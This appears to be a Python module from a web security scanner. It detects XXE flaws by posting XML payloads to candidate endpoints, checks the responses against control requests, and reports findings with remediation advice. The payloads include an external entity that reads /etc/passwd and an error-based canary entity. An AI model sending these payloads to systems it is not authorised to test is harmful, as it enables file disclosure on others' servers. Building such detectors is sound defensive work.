"""XXE probing -- safe, out-of-band-free external-entity detection.

Prior to 0.7, XXE only surfaced as an advisory (candidate XML endpoints).
This module sends *real* (non-destructive) XML entity probes to candidate
endpoints and decides from differential evidence:

1. **File-disclosure probe** -- a DOCTYPE declaring an external entity that
   reads ``/etc/passwd``. If the response contains passwd-shaped lines,
   the parser resolved the entity and returned the file: full proof.
2. **Error-based canary probe** -- an entity pointing at a nonexistent
   ``file:///bhxxe-<canary>`` path. XML parsers that refuse to resolve
   external entities reject the document *silently* (same response as the
   baseline); a parser that resolves them typically leaks the failed URI
   in its error message, so the random canary appearing in the response
   is proof the entity was processed.
3. **Controls** -- a no-DOCTYPE baseline and a DOCTYPE-without-entity
   negative control must both stay clean, or the finding is dropped.

Only documented, harmless file targets are used; no out-of-band DNS/HTTP
callbacks are initiated, and candidate endpoints are never denylisted
targets (every request flows through the guarded client).
"""

from __future__ import annotations

import random
import string

from ...models import Category, Finding, Severity
from ..base import Module, RequestTarget, ScanContext, register

PASSWD_LINE_RE = r"[a-zA-Z0-9_.-]+:[x*!-]:\d+:\d+:"
MAX_PROBES = 6  # candidate endpoints tried per scan


def _canary(prefix: str = "bhxxe") -> str:
    return f"{prefix}{''.join(random.choices(string.ascii_lowercase + string.digits, k=8))}"


def _xml_targets(ctx: ScanContext) -> list[RequestTarget]:
    """Candidate endpoints: POST-able targets first, then any GET target."""
    posts = [rt for rt in ctx.request_targets if rt.method.upper() == "POST"]
    gets = [rt for rt in ctx.request_targets if rt.method.upper() != "POST"]
    return (posts + gets)[:MAX_PROBES]


def _doc(payload_entities: str) -> str:
    return (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        f"<!DOCTYPE r [{payload_entities}]>\n<r>&xxe;</r>"
    )


@register
class XxeProberModule(Module):
    name = "xxe-prober"
    categories = [Category.XXE]
    passive = False
    aggressive_required = True

    async def run(self, ctx: ScanContext) -> list[Finding]:
        findings: list[Finding] = []
        for rt in _xml_targets(ctx):
            canary = _canary()
            probes = [
                # (label, body, detector)
                (
                    "file disclosure",
                    _doc('<!ENTITY xxe SYSTEM "file:///etc/passwd">'),
                    "passwd",
                ),
                (
                    "entity resolution (error-based)",
                    _doc(f'<!ENTITY xxe SYSTEM "file:///{canary}">'),
                    "canary",
                ),
            ]
            for label, body, kind in probes:
                # Deterministic controls: a body without a DOCTYPE and a
                # DOCTYPE whose entity is a harmless internal literal.
                no_doctype = await ctx.client.post(rt.url, data="<r>ping</r>")
                neg_control = await ctx.client.post(
                    rt.url, data='<?xml version="1.0"?><!DOCTYPE r [<!ENTITY safe "hello">]><r>&safe;</r>'
                )
                if not no_doctype.ok:
                    continue  # endpoint is not XML-speaking; next candidate
                r = await ctx.client.post(
                    rt.url, data=body, headers={"Content-Type": "application/xml"}
                )
                if not r.ok:
                    continue

                import re as _re

                if kind == "passwd":
                    hit = _re.search(PASSWD_LINE_RE, r.text) is not None
                    clean_controls = (
                        _re.search(PASSWD_LINE_RE, no_doctype.text) is None
                        and _re.search(PASSWD_LINE_RE, neg_control.text) is None
                    )
                    evidence = (
                        f"XML entity referencing file:///etc/passwd returned passwd-shaped lines:\n"
                        f"{r.text[:400]}"
                    )
                else:  # canary
                    hit = canary in r.text and canary not in no_doctype.text
                    clean_controls = canary not in neg_control.text
                    evidence = (
                        f"Entity targeting file:///{canary} (nonexistent) made the parser echo "
                        f"the URI back in an error -- proving external entities are resolved:\n"
                        f"{r.text[:400]}"
                    )

                if hit and clean_controls:
                    findings.append(
                        Finding(
                            category=Category.XXE,
                            title=f"XML External Entity ({label}) on {rt.url}",
                            severity=Severity.HIGH,
                            confidence="confirmed",
                            url=rt.url,
                            description=(
                                "The XML parser at this endpoint resolves external entities. "
                                + (
                                    "Internal files (/etc/passwd) were read and reflected into "
                                    "the response."
                                    if kind == "passwd"
                                    else "Parser errors echo entity URIs (error-based XXE), "
                                    "which exfiltrates file content through error messages."
                                )
                            ),
                            evidence=evidence,
                            request=f"POST {rt.url} (application/xml) body:\n{body}",
                            response_excerpt=r.text[:600],
                            remediation=(
                                "Disable DTDs/external entities (libxml: XML_PARSE_NOENT off, "
                                "defuse_xml_entities, javax.xml.XMLConstants.FEATURE_SECURE_PROCESSING); "
                                "prefer JSON."
                            ),
                            cwe="CWE-611",
                            module=self.name,
                            verified=True,
                        )
                    )
                    break  # one proof per endpoint is enough
        return findings
